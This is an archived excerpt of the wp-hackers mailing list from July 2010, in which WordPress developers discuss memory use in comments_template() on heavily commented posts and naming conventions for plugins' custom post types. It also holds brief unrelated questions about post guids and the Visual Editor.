>>> post? ?Is there another solution?
>>
>> Comments don't get pulled out of the database until the
>> comments_template function is called, so that basically means you've
>> got 8+ meg of comments on the post in question.
>>
>>
>> -Otto
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>

From peter.westwood at ftwr.co.uk  Sat Jul 10 05:21:56 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Sat, 10 Jul 2010 06:21:56 +0100
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
	<AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>
	<AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com>
Message-ID: <EDCA28A7-69BC-4C3A-8C39-263FB8C742A0@ftwr.co.uk>

William,

Please reopen that ticket and put as much detail on the problem as you have discovered.

I don't see that the reason for closure on there is necessarily valid - we should try and see if we can improve this as.

As you rightly suggest we should be able to scale nicely when there are alot of comments on a post.

--
Peter Westwood
http://peter.westwood.name

On 10 Jul 2010, at 05:30, William Canino <william.canino at googlemail.com> wrote:

>> I will have to therefore write my own comments_template()....
> 
> ... Writing this turns out to be a complicated mod because the various
> comment helper functions and callbacks presume that $comments has all
> the comments. :-(
> 
> ----> Well, this means while WordPress is not a blog anymore per se,
> WordPress is NOT a discussion forum either, because WordPress doesn't
> scale when it has a plethora of comments.
> 
> In the meantime, the palliative that lowered the memory usage by 3MB
> is by commenting out "update_comment_cache($wp_query->comments);"
> 
> 
> 
> 
> 
> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>> (I should add that I have threading off.)
>> 
>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>> 
>> https://core.trac.wordpress.org/ticket/8071
>> 
>> I will have to therefore write my own comments_template()....  Does
>> anyone have an alternative solution?
>> 
>> W
>> 
>> 
>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>>> <william.canino at googlemail.com> wrote:
>>>> <!-- BEFORE: 25033360 -->
>>>> <!-- START: 33953448 -->
>>>> ... (comments go here) ...
>>>> <!-- END: 36172480 -->
>>>> <!-- AFTER: 36113680 -->
>>>> 
>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>> 
>>>> Do I really have to move out some of the older comments of this blog
>>>> post?  Is there another solution?
>>> 
>>> Comments don't get pulled out of the database until the
>>> comments_template function is called, so that basically means you've
>>> got 8+ meg of comments on the post in question.
>>> 
>>> 
>>> -Otto
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
> 
> 
> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>> (I should add that I have threading off.)
>> 
>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>> 
>> https://core.trac.wordpress.org/ticket/8071
>> 
>> I will have to therefore write my own comments_template()....  Does
>> anyone have an alternative solution?
>> 
>> W
>> 
>> 
>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>>> <william.canino at googlemail.com> wrote:
>>>> <!-- BEFORE: 25033360 -->
>>>> <!-- START: 33953448 -->
>>>> ... (comments go here) ...
>>>> <!-- END: 36172480 -->
>>>> <!-- AFTER: 36113680 -->
>>>> 
>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>> 
>>>> Do I really have to move out some of the older comments of this blog
>>>> post?  Is there another solution?
>>> 
>>> Comments don't get pulled out of the database until the
>>> comments_template function is called, so that basically means you've
>>> got 8+ meg of comments on the post in question.
>>> 
>>> 
>>> -Otto
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>> 
>> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From otto at ottodestruct.com  Sat Jul 10 05:25:33 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 10 Jul 2010 00:25:33 -0500
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <EDCA28A7-69BC-4C3A-8C39-263FB8C742A0@ftwr.co.uk>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com> 
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com> 
	<AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com> 
	<AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com> 
	<EDCA28A7-69BC-4C3A-8C39-263FB8C742A0@ftwr.co.uk>
Message-ID: <AANLkTimmUXvSBErhnUslVesjcLwvmJGS7lRMXmAj6-jG@mail.gmail.com>

Agreed, and also there's that line of code in comments_template that's
been bugging me for a long time:

/** @todo Use API instead of SELECTs. */

Admittedly, I understand why this hasn't been done (it's a lot of
work), but it does seem like a valid reason to have a ticket in trac
for it.

-Otto



On Sat, Jul 10, 2010 at 12:21 AM, Peter Westwood
<peter.westwood at ftwr.co.uk> wrote:
> William,
>
> Please reopen that ticket and put as much detail on the problem as you have discovered.
>
> I don't see that the reason for closure on there is necessarily valid - we should try and see if we can improve this as.
>
> As you rightly suggest we should be able to scale nicely when there are alot of comments on a post.
>
> --
> Peter Westwood
> http://peter.westwood.name
>
> On 10 Jul 2010, at 05:30, William Canino <william.canino at googlemail.com> wrote:
>
>>> I will have to therefore write my own comments_template()....
>>
>> ... Writing this turns out to be a complicated mod because the various
>> comment helper functions and callbacks presume that $comments has all
>> the comments. :-(
>>
>> ----> Well, this means while WordPress is not a blog anymore per se,
>> WordPress is NOT a discussion forum either, because WordPress doesn't
>> scale when it has a plethora of comments.
>>
>> In the meantime, the palliative that lowered the memory usage by 3MB
>> is by commenting out "update_comment_cache($wp_query->comments);"
>>
>>
>>
>>
>>
>> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>>> (I should add that I have threading off.)
>>>
>>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>>>
>>> https://core.trac.wordpress.org/ticket/8071
>>>
>>> I will have to therefore write my own comments_template().... ?Does
>>> anyone have an alternative solution?
>>>
>>> W
>>>
>>>
>>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>>>> <william.canino at googlemail.com> wrote:
>>>>> <!-- BEFORE: 25033360 -->
>>>>> <!-- START: 33953448 -->
>>>>> ... (comments go here) ...
>>>>> <!-- END: 36172480 -->
>>>>> <!-- AFTER: 36113680 -->
>>>>>
>>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>>>
>>>>> Do I really have to move out some of the older comments of this blog
>>>>> post? ?Is there another solution?
>>>>
>>>> Comments don't get pulled out of the database until the
>>>> comments_template function is called, so that basically means you've
>>>> got 8+ meg of comments on the post in question.
>>>>
>>>>
>>>> -Otto
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>>
>>
>> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
>>> (I should add that I have threading off.)
>>>
>>> Denis-de-Bernardy has declared the issue as wont-fix :-(
>>>
>>> https://core.trac.wordpress.org/ticket/8071
>>>
>>> I will have to therefore write my own comments_template().... ?Does
>>> anyone have an alternative solution?
>>>
>>> W
>>>
>>>
>>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
>>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
>>>> <william.canino at googlemail.com> wrote:
>>>>> <!-- BEFORE: 25033360 -->
>>>>> <!-- START: 33953448 -->
>>>>> ... (comments go here) ...
>>>>> <!-- END: 36172480 -->
>>>>> <!-- AFTER: 36113680 -->
>>>>>
>>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
>>>>>
>>>>> Do I really have to move out some of the older comments of this blog
>>>>> post? ?Is there another solution?
>>>>
>>>> Comments don't get pulled out of the database until the
>>>> comments_template function is called, so that basically means you've
>>>> got 8+ meg of comments on the post in question.
>>>>
>>>>
>>>> -Otto
>>>> _______________________________________________
>>>> wp-hackers mailing list
>>>> wp-hackers at lists.automattic.com
>>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>>>
>>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From banago at gmail.com  Sat Jul 10 09:52:46 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Sat, 10 Jul 2010 11:52:46 +0200
Subject: [wp-hackers] Memory spike in comments_template()
In-Reply-To: <AANLkTimmUXvSBErhnUslVesjcLwvmJGS7lRMXmAj6-jG@mail.gmail.com>
References: <AANLkTilicdyVVCxcJmMdxhQcnu8PBEXDnwTPBY2VO8m7@mail.gmail.com>
	<AANLkTilF37hio4zdo82JvGHxHHLI9ckAZJb97g7BrXAr@mail.gmail.com>
	<AANLkTind79h-rV9sJb3bJnkO0CKjr0Cr8493F5Q_fdGt@mail.gmail.com>
	<AANLkTim1jNrhP-DFK3ol4SM688UryGJTAWaEfdBleSrG@mail.gmail.com>
	<EDCA28A7-69BC-4C3A-8C39-263FB8C742A0@ftwr.co.uk>
	<AANLkTimmUXvSBErhnUslVesjcLwvmJGS7lRMXmAj6-jG@mail.gmail.com>
Message-ID: <AANLkTimByyQZsxBCOr-NDOWYjEuSAM7aPJ0vBGVM4tOp@mail.gmail.com>

Comments will need enhancement for sure, especially now that bbPress is
becoming a plugin that will use custom post types. This means comments will
need eventually to scale very well and behave nicely in BB mode.

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 10 July 2010 07:25, Otto <otto at ottodestruct.com> wrote:

> Agreed, and also there's that line of code in comments_template that's
> been bugging me for a long time:
>
> /** @todo Use API instead of SELECTs. */
>
> Admittedly, I understand why this hasn't been done (it's a lot of
> work), but it does seem like a valid reason to have a ticket in trac
> for it.
>
> -Otto
>
>
>
> On Sat, Jul 10, 2010 at 12:21 AM, Peter Westwood
> <peter.westwood at ftwr.co.uk> wrote:
> > William,
> >
> > Please reopen that ticket and put as much detail on the problem as you
> have discovered.
> >
> > I don't see that the reason for closure on there is necessarily valid -
> we should try and see if we can improve this as.
> >
> > As you rightly suggest we should be able to scale nicely when there are
> alot of comments on a post.
> >
> > --
> > Peter Westwood
> > http://peter.westwood.name
> >
> > On 10 Jul 2010, at 05:30, William Canino <william.canino at googlemail.com>
> wrote:
> >
> >>> I will have to therefore write my own comments_template()....
> >>
> >> ... Writing this turns out to be a complicated mod because the various
> >> comment helper functions and callbacks presume that $comments has all
> >> the comments. :-(
> >>
> >> ----> Well, this means while WordPress is not a blog anymore per se,
> >> WordPress is NOT a discussion forum either, because WordPress doesn't
> >> scale when it has a plethora of comments.
> >>
> >> In the meantime, the palliative that lowered the memory usage by 3MB
> >> is by commenting out "update_comment_cache($wp_query->comments);"
> >>
> >>
> >>
> >>
> >>
> >> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
> >>> (I should add that I have threading off.)
> >>>
> >>> Denis-de-Bernardy has declared the issue as wont-fix :-(
> >>>
> >>> https://core.trac.wordpress.org/ticket/8071
> >>>
> >>> I will have to therefore write my own comments_template()....  Does
> >>> anyone have an alternative solution?
> >>>
> >>> W
> >>>
> >>>
> >>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
> >>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
> >>>> <william.canino at googlemail.com> wrote:
> >>>>> <!-- BEFORE: 25033360 -->
> >>>>> <!-- START: 33953448 -->
> >>>>> ... (comments go here) ...
> >>>>> <!-- END: 36172480 -->
> >>>>> <!-- AFTER: 36113680 -->
> >>>>>
> >>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
> >>>>>
> >>>>> Do I really have to move out some of the older comments of this blog
> >>>>> post?  Is there another solution?
> >>>>
> >>>> Comments don't get pulled out of the database until the
> >>>> comments_template function is called, so that basically means you've
> >>>> got 8+ meg of comments on the post in question.
> >>>>
> >>>>
> >>>> -Otto
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>
> >>
> >>
> >> On 09/07/2010, William Canino <william.canino at googlemail.com> wrote:
> >>> (I should add that I have threading off.)
> >>>
> >>> Denis-de-Bernardy has declared the issue as wont-fix :-(
> >>>
> >>> https://core.trac.wordpress.org/ticket/8071
> >>>
> >>> I will have to therefore write my own comments_template()....  Does
> >>> anyone have an alternative solution?
> >>>
> >>> W
> >>>
> >>>
> >>> On 09/07/2010, Otto <otto at ottodestruct.com> wrote:
> >>>> On Fri, Jul 9, 2010 at 3:57 PM, William Canino
> >>>> <william.canino at googlemail.com> wrote:
> >>>>> <!-- BEFORE: 25033360 -->
> >>>>> <!-- START: 33953448 -->
> >>>>> ... (comments go here) ...
> >>>>> <!-- END: 36172480 -->
> >>>>> <!-- AFTER: 36113680 -->
> >>>>>
> >>>>> The memory usage jumped 8.5 megabytes between BEFORE and START.
> >>>>>
> >>>>> Do I really have to move out some of the older comments of this blog
> >>>>> post?  Is there another solution?
> >>>>
> >>>> Comments don't get pulled out of the database until the
> >>>> comments_template function is called, so that basically means you've
> >>>> got 8+ meg of comments on the post in question.
> >>>>
> >>>>
> >>>> -Otto
> >>>> _______________________________________________
> >>>> wp-hackers mailing list
> >>>> wp-hackers at lists.automattic.com
> >>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>>>
> >>>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From 24-7 at gmx.net  Sat Jul 10 10:46:17 2010
From: 24-7 at gmx.net (24/7)
Date: Sat, 10 Jul 2010 03:46:17 -0700 (PDT)
Subject: [wp-hackers] update $wp_query->post->guid fails
In-Reply-To: <AANLkTik2-dgIQtDkgVnS7PT7x0DCiEFblvEeeoM64QgH@mail.gmail.com>
References: <668776ba-a385-41a4-813f-3d125ad3d698@t10g2000yqg.googlegroups.com>
	<AANLkTikGcVdvSSQnly8BtgSTenIljOE8gXt4y6_ra3Pz@mail.gmail.com> 
	<AANLkTilqxaRlQrOPYPWPRIcCFQi9Q_GJhDh2VROhdIgE@mail.gmail.com> 
	<AANLkTik2-dgIQtDkgVnS7PT7x0DCiEFblvEeeoM64QgH@mail.gmail.com>
Message-ID: <80995122-0ada-4b08-a07d-0373a9bf7a36@u26g2000yqu.googlegroups.com>

Thanks for all your answers. I read the Trac Ticket too, so i don't
double, what's already in there. This issue is really strange... I
still wonder once a week when i come across some wordpress part,
that's a relict or just there since version 1.5 and still unused.
Thanks for explaining.

From arlenbee at gmail.com  Sat Jul 10 18:44:06 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Sat, 10 Jul 2010 14:44:06 -0400
Subject: [wp-hackers] Visual Editor is breaking lists
Message-ID: <AANLkTil3L46pHVVcx-G_xR3ClQbDnmJqCvaxLBG7XZuS@mail.gmail.com>

Why is the Visual Editor always breaking my lists?

From mikeschinkel at newclarity.net  Sat Jul 10 19:59:33 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 10 Jul 2010 15:59:33 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
Message-ID: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>

Hi all,

Now that 3.0 is out it seems people are diving into using it in really incredible ways.  

One thing of course is that there will be an explosion of plugins with custom post types and clearly many pending incompatibilities among plugins that are attempting to address different aspects of the same problem.  For examples: 

-- Plugins might model real estate properties using a custom post type named "property", "properties", "re-prop", "real_estate_property" or something else. Even if they have compatible functionality they still won't be able to be used together.

-- Plugins might use the same name like, i.e. "event", but then use different names for custom fields.

-- Most importantly, it will likely be impossible to add any new types to core w/o potentially breaking existing plugins and/or existing custom implementations.

Clearly, there's no way to resolve these issues completely but it would be nice to attempt to minimize the issues. With that in mind I'd like to make the following strawman proposals in order to open up the topic for discussion:

1.) Create a place on WordPress.org for ad-hoc community "working groups" around an area of custom post type interest (two that are obvious to me are events and real estate properties, but there are many more.) The group could establish an accepted post_type name and collaborate on a common set of custom field names and uses and possibly even create some common shared functionality (which could end up making it's way into a core plugin?)

2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.

3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.

4.) State that all post_type names prefixed with an underscore are reserved for core and core plugins (i.e. "_event") and consider the possibility of backporting at least the newer post type to that approach (i.e. "nav_menu_item" => "_nav_menu_item") if not even post, page, revision and attachment on a long term basis.

Again, these are just strawman proposals; hoping that I can spark and honest and respectful discussion about the potential to  address these issues before they become a bigger mess?

-Mike


From otto at ottodestruct.com  Sat Jul 10 20:05:49 2010
From: otto at ottodestruct.com (Otto)
Date: Sat, 10 Jul 2010 15:05:49 -0500
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
Message-ID: <AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>

One would hope that plugins would use a prefix naming convention for
their custom types in the same way we recommend making function names
and such. plugin_whatever and so forth.

I like your ideas, and I would also suggest that plugin authors doing
the same sort of things in their plugins start to collaborate amongst
themselves to build larger plugins with many authors. I think that
plugins along these lines, with a wide variety of authors
collaborating on them, have a relatively decent shot of becoming
"core" plugins. Long term, of course.

Hopefully the 3.org updates will help out in this respect.

-Otto



On Sat, Jul 10, 2010 at 2:59 PM, Mike Schinkel
<mikeschinkel at newclarity.net> wrote:
> Hi all,
>
> Now that 3.0 is out it seems people are diving into using it in really incredible ways.
>
> One thing of course is that there will be an explosion of plugins with custom post types and clearly many pending incompatibilities among plugins that are attempting to address different aspects of the same problem. ?For examples:
>
> -- Plugins might model real estate properties using a custom post type named "property", "properties", "re-prop", "real_estate_property" or something else. Even if they have compatible functionality they still won't be able to be used together.
>
> -- Plugins might use the same name like, i.e. "event", but then use different names for custom fields.
>
> -- Most importantly, it will likely be impossible to add any new types to core w/o potentially breaking existing plugins and/or existing custom implementations.
>
> Clearly, there's no way to resolve these issues completely but it would be nice to attempt to minimize the issues. With that in mind I'd like to make the following strawman proposals in order to open up the topic for discussion:
>
> 1.) Create a place on WordPress.org for ad-hoc community "working groups" around an area of custom post type interest (two that are obvious to me are events and real estate properties, but there are many more.) The group could establish an accepted post_type name and collaborate on a common set of custom field names and uses and possibly even create some common shared functionality (which could end up making it's way into a core plugin?)
>
> 2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.
>
> 3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.
>
> 4.) State that all post_type names prefixed with an underscore are reserved for core and core plugins (i.e. "_event") and consider the possibility of backporting at least the newer post type to that approach (i.e. "nav_menu_item" => "_nav_menu_item") if not even post, page, revision and attachment on a long term basis.
>
> Again, these are just strawman proposals; hoping that I can spark and honest and respectful discussion about the potential to ?address these issues before they become a bigger mess?
>
> -Mike
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sat Jul 10 20:09:39 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 10 Jul 2010 16:09:39 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
Message-ID: <20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>

On Jul 10, 2010, at 4:05 PM, Otto wrote:
> One would hope that plugins would use a prefix naming convention for
> their custom types in the same way we recommend making function names
> and such. plugin_whatever and so forth.

One would hope, but none of the examples I've seen online are doing that so I doubt that many people will think to do so. 

Not sure how to get that "best practice" out there so that it becomes widely know?

> I like your ideas, and I would also suggest that plugin authors doing
> the same sort of things in their plugins start to collaborate amongst
> themselves to build larger plugins with many authors.

+1

-Mike

From charles at cefm.ca  Sat Jul 10 20:30:46 2010
From: charles at cefm.ca (Charles Frees-Melvin)
Date: Sat, 10 Jul 2010 17:30:46 -0300
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
Message-ID: <338A5FEC-A4F9-4951-88A9-BAB66384B088@cefm.ca>

What if we were to have a Codex page where plugin authors can list their custom post type there by allowing other plugin authors to see the most used post type for their niche. Then list any that are specific or need to be different be prefixed with the plugin name as mentioned.

In this format the core team can choose a name not listed, or pre-reserve a custom post type when a patch or ticket is in Trac.

Just a thought, but would require a tough luck approach if core chooses one that was not on said list.
--
Charles E. Frees-Melvin
charles at cefm.ca
www.cefm.ca
506-640-1007

Sent from my iPhone 3G

On 2010-07-10, at 17:09, Mike Schinkel <mikeschinkel at newclarity.net> wrote:

> On Jul 10, 2010, at 4:05 PM, Otto wrote:
>> One would hope that plugins would use a prefix naming convention for
>> their custom types in the same way we recommend making function names
>> and such. plugin_whatever and so forth.
> 
> One would hope, but none of the examples I've seen online are doing that so I doubt that many people will think to do so. 
> 
> Not sure how to get that "best practice" out there so that it becomes widely know?
> 
>> I like your ideas, and I would also suggest that plugin authors doing
>> the same sort of things in their plugins start to collaborate amongst
>> themselves to build larger plugins with many authors.
> 
> +1
> 
> -Mike
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From paul at codehooligans.com  Sat Jul 10 21:51:54 2010
From: paul at codehooligans.com (Paul)
Date: Sat, 10 Jul 2010 17:51:54 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
Message-ID: <7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>

Personally I can't say I like the idea of theses solutions. Having a codex page or central site where you need to somehow register your post type name just seems wrong to me. Too many extra steps to just through. 

> -- Most importantly, it will likely be impossible to add any new types to core w/o potentially breaking existing plugins and/or existing custom implementations.

One idea for the core WP side is to have all the post types proceeded with wp_ and make this reserves for all core post types to that plugin authors cannot register anything beginning with 'wp_'.

> 1.) Create a place on WordPress.org for ad-hoc community "working groups" around an area of custom post type interest (two that are obvious to me are events and real estate properties, but there are many more.) The group could establish an accepted post_type name and collaborate on a common set of custom field names and uses and possibly even create some common shared functionality (which could end up making it's way into a core plugin?)

I agree with your thought here but don't really see a way to control this. It sort of goes against the openness of the WordPress plugin architecture. Consider how many Event/Calendar plugins are currently on WordPress.org (dozens). Some are great and do 75% of what I need. Others not so much. Even without the new custom post type functionality can you see a way to tell these plugin authors "Hey, if you plan to develop an Event/Calendar plugin it must meet this list of function and custom field requirements.". Again, I say it goes against the openness of the infrastructure which makes WordPress what it is. Nor do I like the thought that via a community there will be a combined effort to develop a single kick-ass Event/Calendar plugin. Because my needs for an Events plugin are not the same as your or others. I like having dozens of choices. 

A bigger question is who decided what warrant putting these working groups together?


> 2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.
The 'Digg' effect. Personally I don't see it working for any of my client sites. Sorry. 

> 3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.

Yeah, but you are talking about the first parameter to the register_post_type function which is different than the labels. I can register an Events custom type as 'THX1138'. The post type 'key' really is insignificant except it needs to be unique for my post type needs. Personally, I worry about having this action in the init process. Why is it required to register a post type for every page load? Why is this not done once like when a plugin is activated? But I digress. 

> 4.) State that all post_type names prefixed with an underscore are reserved for core and core plugins (i.e. "_event") and consider the possibility of backporting at least the newer post type to that approach (i.e. "nav_menu_item" => "_nav_menu_item") if not even post, page, revision and attachment on a long term basis.

Again my comment from above. Underscore works but why not 'wp_' like most of the functions in core. 



On Jul 10, 2010, at 3:59 PM, Mike Schinkel wrote:

> Hi all,
> 
> Now that 3.0 is out it seems people are diving into using it in really incredible ways.  
> 
> One thing of course is that there will be an explosion of plugins with custom post types and clearly many pending incompatibilities among plugins that are attempting to address different aspects of the same problem.  For examples: 
> 
> -- Plugins might model real estate properties using a custom post type named "property", "properties", "re-prop", "real_estate_property" or something else. Even if they have compatible functionality they still won't be able to be used together.
> 
> -- Plugins might use the same name like, i.e. "event", but then use different names for custom fields.
> 
> -- Most importantly, it will likely be impossible to add any new types to core w/o potentially breaking existing plugins and/or existing custom implementations.
> 
> Clearly, there's no way to resolve these issues completely but it would be nice to attempt to minimize the issues. With that in mind I'd like to make the following strawman proposals in order to open up the topic for discussion:
> 
> 1.) Create a place on WordPress.org for ad-hoc community "working groups" around an area of custom post type interest (two that are obvious to me are events and real estate properties, but there are many more.) The group could establish an accepted post_type name and collaborate on a common set of custom field names and uses and possibly even create some common shared functionality (which could end up making it's way into a core plugin?)
> 
> 2.) Give people a place on WordPress.org to propose new working groups and if they collect enough "+1s" (10 people or more? 25? 100?) then they get their working group.
> 
> 3.) Recommend that all values used for post_type in the wp_posts table be either singular or plural (my strong preference is singular but will go with whatever the consensus is) except for in use-cases where the rule would obviously not apply. And recommend that they use dashes or underscores for post type names, one or the other.
> 
> 4.) State that all post_type names prefixed with an underscore are reserved for core and core plugins (i.e. "_event") and consider the possibility of backporting at least the newer post type to that approach (i.e. "nav_menu_item" => "_nav_menu_item") if not even post, page, revision and attachment on a long term basis.
> 
> Again, these are just strawman proposals; hoping that I can spark and honest and respectful discussion about the potential to  address these issues before they become a bigger mess?
> 
> -Mike
> 
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From elfin at elfden.co.uk  Sat Jul 10 23:05:48 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Sun, 11 Jul 2010 00:05:48 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
Message-ID: <4C38FCCC.8030507@elfden.co.uk>

On 10/07/2010 21:09, Mike Schinkel wrote:
> On Jul 10, 2010, at 4:05 PM, Otto wrote:
>> One would hope that plugins would use a prefix naming convention
>> for their custom types in the same way we recommend making
>> function names and such. plugin_whatever and so forth.
>
> One would hope, but none of the examples I've seen online are doing
> that so I doubt that many people will think to do so.
>
> Not sure how to get that "best practice" out there so that it
> becomes widely know?

Well adding it to:
http://codex.wordpress.org/Custom_Post_Types

and changing the example to use a prefix would be a start.

Rich

From elfin at elfden.co.uk  Sat Jul 10 23:08:56 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Sun, 11 Jul 2010 00:08:56 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<7A285335-C7F7-49C1-B9CF-D8D1473FB587@codehooligans.com>
Message-ID: <4C38FD88.4030501@elfden.co.uk>

On 10/07/2010 22:51, Paul wrote:
> Personally I can't say I like the idea of theses solutions. Having
> a codex page or central site where you need to somehow register
> your post type name just seems wrong to me. Too many extra steps to
> just through.
>
>> -- Most importantly, it will likely be impossible to add any new
>> types to core w/o potentially breaking existing plugins and/or
>> existing custom implementations.
>
